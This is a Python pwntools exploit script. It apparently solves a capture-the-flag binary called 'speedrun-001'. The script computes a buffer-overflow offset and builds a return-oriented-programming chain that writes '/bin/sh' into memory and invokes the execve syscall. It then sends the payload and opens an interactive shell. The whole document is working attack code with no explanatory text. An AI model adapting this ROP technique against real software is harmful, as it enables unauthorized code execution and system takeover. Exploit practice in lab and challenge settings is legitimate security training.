from pwn import *

context.binary = './speedrun-001'
io = process('./speedrun-001')
# io = gdb.debug('./speedrun-001', '''
#     b *0x400bab
#     c
# ''')

RET_ADDR_OFFSET = cyclic_find(0x6b616169)
SYSCALL_GADGET_ADDR = 0x000000000040129c
WRITE_SYSCALL_ADDR = 0x000000000048d251     # mov qword ptr [rax], rdx ; ret
FREE_SPACE = 0x6bc050
EXECVE_SYSCALL_NR = 59

log.info("Generating ROP Payload...")
rop = ROP('./speedrun-001')
# Write /bin/sh to 0x6bc050
rop(rax=FREE_SPACE, rdx=b'/bin/sh\x00')
rop.raw(WRITE_SYSCALL_ADDR)

# Execve /bin/sh
rop(rax=EXECVE_SYSCALL_NR, rdi=FREE_SPACE, rsi=0, rdx=0)
rop.raw(SYSCALL_GADGET_ADDR)

print(rop.dump())

log.info("Sending Payload...")
payload = flat({
    RET_ADDR_OFFSET : rop.chain()
})

io.sendline(payload)
io.clean()
log.success("Got Shell!")
io.interactive()
